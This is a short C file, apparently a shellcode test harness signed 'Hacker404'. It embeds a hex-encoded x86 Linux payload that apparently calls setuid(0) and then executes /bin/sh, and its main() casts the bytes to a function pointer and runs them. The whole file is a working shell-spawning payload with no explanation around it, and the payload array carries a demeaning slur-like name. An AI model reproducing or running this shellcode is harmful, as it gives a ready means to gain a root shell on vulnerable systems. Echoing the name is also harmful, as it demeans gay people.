/*
# # # # # # # #  # # # # # # # # # # # # # # # # # # # # # # # # # #  # # # #  #
#  __        ___     _ _       _   _       _                                   #
#  \ \      / / |__ (_) |_ ___| | | | __ _| |_                                 #
#   \ \ /\ / /| '_ \| | __/ _ \ |_| |/ _` | __|                                #
#    \ V  V / | | | | | ||  __/  _  | (_| | |_                                 #
#     \_/\_/  |_| |_|_|\__\___|_| |_|\__,_|\__|                                #
#                                                   Hacker404                  #
# # # # # # # #  # # # # # # # # # # # # # # # # # # # # # # # # # #  # # # #  #
*/

#include <stdio.h>
#include <string.h>


unsigned char gaycode[] =
   "\xeb\x21\x31\xdb\x8d\x43\x17\xcd\x80\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89"
   "\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8"
   "\xda\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

int main()
{
   void (*f)();


   f = (void *) gaycode;

   printf("%d\n", strlen(gaycode));

   f();

    return 1337;
}
